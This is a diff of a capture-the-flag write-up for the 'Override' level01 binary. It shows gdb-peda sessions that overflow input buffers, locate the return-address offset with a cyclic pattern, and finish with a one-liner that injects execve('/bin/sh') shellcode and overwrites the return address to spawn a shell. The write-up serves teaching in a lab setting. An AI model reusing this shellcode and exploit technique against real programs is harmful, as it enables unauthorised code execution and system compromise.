@@ -1,4 +1,4 @@
-</pre>
+<pre>
 $> gdb ./level01 
 gdb-peda$ r < <(python -c "print('dat_wil' + 'A' * 100)"; python -c "print('admin' + 'B' * 500)")
 Starting program: /home/alarm/42/Override/level01/Ressources/level01 < <(python -c "print('dat_wil' + 'A' * 100)"; python -c "print('admin' + 'B' * 500)")
@@ -38,6 +38,7 @@ Stopped reason: SIGSEGV
 0x42424242 in ?? ()
 gdb-peda$ 
 </pre>
+<pre>
 gdb-peda$ pattern create 100
 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
 gdb-peda$ r < <(python -c "print('dat_wil' + 'A' * 100)"; python -c "print('admin' + 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL')")
@@ -77,9 +78,10 @@ Legend: code, data, rodata, value
 Stopped reason: SIGSEGV
 0x35414166 in ?? ()
 gdb-peda$ pattern offset fAA5
-fAA5 found at offset: 84
+fAA5 found at offset: 75
+<pre>
 
 ```
-level01@OverRide:~$ (python -c "print('dat_wil0' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 100)"; python -c "print('admin' + 'B' * 75 + '\x48\xa0\x04\x08')"; cat) | ./level01 
+$> (python -c "print('dat_wil0' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 100)"; python -c "print('admin' + 'B' * 75 + '\x48\xa0\x04\x08')"; cat) | ./level01 
 ```
 
